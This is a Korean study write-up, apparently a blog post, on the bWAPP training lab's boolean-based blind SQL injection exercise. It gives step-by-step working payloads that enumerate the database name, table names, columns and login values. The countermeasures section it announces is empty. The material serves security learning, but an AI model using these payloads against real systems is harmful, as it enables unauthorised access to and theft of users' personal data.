---
title: "[bWAPP] 1. Injection - SQL Injection - Blind - Boolean-Based"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

<br>

## Blind Injection

Blind SQL Injection으로 많이 사용

SQL인젝션 공격에는 쿼리 조건을 무력화하여 인증을 우회하거나,쿼리 결과에 정보를 붙여서 데이터를 유출하거나 시스템 명령어를 삽입하는 형태로 공격이 진행

하지만, 공격하는 대상 웹페이지가 어떤 오류도 출력하지 않고 쿼리 겨로가 리스트도 제공하지 않는다면 

Blind SQL Injection으로 쿼리 결과의 참/거짓을 통해 DB 값 유출해 내는 기법

<br>

### Boolean - Based

![image-20220317013803688](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317013803688.png)

- 참 거짓을 이용해야 하기 때문에
- 참, 거짓일 때의 반응 살펴보기

![image-20220317013920795](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317013920795.png)

- 참

![image-20220317013942282](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317013942282.png)

- 거짓

<br>

### DB 조회

![image-20220317014200725](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317014200725.png)

`' or length(database())=1#`

- 이런식으로 DB의 길이를 하나하나 참 거짓으로 대입해봐서 알아내면 됨

 `' or ascii(substring(database(),1,1))>=97#` 

- DB 길이를 알아내고 문자를 알아내야 하는데
- ascii 명령어를 통해 대문자인지 소문자인지를 먼저 구분하고

`' or substring(database(),1,1)='a'#`

- substring 명령어를 통해 database의 첫번쨰 위치의 길이 1값이 a가 맞는지 확인한다.

```
SUBSTR(str, pos, len)
```

- str에서 pos 번째 위치의 len개의 문자를 읽어 들임

<br>

### 테이블 조회

![image-20220317015039652](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317015039652.png)

`' or length((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0,1))=1#`

- 이 또한 length 를 구해주고

`' or ascii(substring((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0,1),1,1))>96#`

- 대소문자 구분

`' or substring((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0,1),1,1)='a'#`

- 문자 대조를 통해 구할 수 있다.
- 손이 많이 가지만 하다보면... 모르겠다..

<br>

### 컬럼 조회

![image-20220317015241761](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317015241761.png)

`' or length((select column_name from information_schema.columns where table_name='heroes' limit 1,1))=1#`

- length 구하고

`' or ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),1,1))>96#`

- 대소문자 구분

`' or substring((select column_name from information_schema.columns where table_name='heroes' limit 1,1),1,1)='a'#`

- 문자 대조

<br>

### 컬럼 속성

![image-20220317015417408](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317015417408.png)

`' or length((select login from heroes limit 0,1))=3 #`

- length

`' or ascii(substring((select login from heroes limit 0,1),1,1))>96#`

- 대소문자 구분

`' or substring((select login from heroes limit 0,1),1,1)='a'#`

- 대조
- 끝까지 해주면 개인정보를 확인할 수 있다.

<br>

<br>

## 대응방안

